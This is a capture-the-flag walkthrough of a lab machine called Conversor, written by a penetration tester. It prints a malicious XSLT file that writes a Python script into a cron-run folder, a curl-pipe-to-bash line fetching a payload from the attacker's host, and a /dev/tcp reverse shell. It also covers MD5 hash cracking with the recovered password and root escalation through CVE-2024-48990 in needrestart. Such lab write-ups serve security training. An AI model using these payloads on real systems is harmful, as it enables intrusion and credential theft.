I start the machine with a quick port scan.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=5000 10.10.11.92                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 07:07 EST
Warning: 10.10.11.92 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.92
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.11.92
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 07:08 EST
Nmap scan report for 10.10.11.92
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
```
Ok se we have ssh and a website open. The site seems to be running apache 2.4.52

The website just has a login screen. I decided to create and account and see whats going on. 
It's just a website where you can upload xml and xslt files to make it into more aeshetic format.

I did some fuzzing 
```bash
bout                   [Status: 200, Size: 2842, Words: 577, Lines: 81, Duration: 333ms]
login                   [Status: 200, Size: 722, Words: 30, Lines: 22, Duration: 72ms]
register                [Status: 200, Size: 726, Words: 30, Lines: 21, Duration: 70ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 59ms]
logout                  [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 289ms]
convert                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 270ms]
                        [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 78ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 363ms]
:: Progress: [220560/220560] :: Job [1/1] :: 192 req/sec :: Duration: [0:26:13] :: Errors: 0 ::
```

I went to the about page and found out that the source code is public and downloadable.

```bash
cat install.md 
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

Ok so in the last line its saying that the server executes all the python scripts located in the /scripts/.py location. We just have to find a way to get our reverse shell script in there for example. 

To be quite frank I have no clue but I'll find out a way. 

Ok I had to have a xml and an maliscious xslt file. And after that I created a python script (the one that will be sent to the victims machine) and then we also created a bash script on our machine which the python script will curl and we receive the reverse shell.


```bash
┌──(kali㉿kali)-[~]
└─$ cat shell.py 
import os; os.system("curl 10.10.14.230:4444/shell.sh|bash")
                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat shell.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.230/4444 0>&1


cat shell.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.230:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>

```

The xml played no role in it and it was pretty much just empty.

Ok but now we have a reverse shell and i found an account but we dont have permissions for their home directory. I decided to import linpeas over to automate the scan.

I found nothing I tried to put a shell into the automated cleanup script but It didnt have elevated permissions so that was a waste of time.

In the machine I found the same app.py code that we were able to download from the website and I found that there is a sqlite3 databse in there somewhere. I just have to find it

```bash
DB_PATH = '/var/www/conversor.htb/instance/users.db'
```

;)


```bash
sqlite> .dump
.dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
INSERT INTO users VALUES(1,'fismathack','5b5c3ac3a1c897c94caad48e6c71fdec');
INSERT INTO users VALUES(5,'pedro','d3ce9efea6244baa7bf718f12dd0c331');
INSERT INTO users VALUES(6,'test2','ad0234829205b9033196ba818f7a872b');
INSERT INTO users VALUES(7,'Test','e1b849f9631ffc1829b2e31402373e3c');
CREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    );
```

Ok we found the hashed password for fismathack and lets bruteforce it with hashcat and login via ssh



I used hashid to identify that its an md5 hash and then i used hashcat to bruteforce it with rockyou.txt


```bash
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

```bash
ssh fismathack@10.10.11.92     
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
```

Great. Now lets get the user.txt and find a way to get root.


```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

I started looking if needrestart had some vulnerabilities. The version is 3.7. 

Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.


I found this great explanation for the exploit. https://github.com/ally-petitt/CVE-2024-48990-Exploit/


It was quite simple, but it actually took me like 2 hours to manage.

But like i said we just tricked by changing the python environment to our own /tmp/exploit and then putting a reverse shell in there and since we can run /usr/sbin/needrestart assudo and it goes to our malicious path and executes and we receive a root shell..

```bash
fismathack@conversor:~$ nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 60540
# whoami
whoami
root
cat /root/root.txt
639c4ae1d3de5f7e8047bbe6a1175447
# 
```
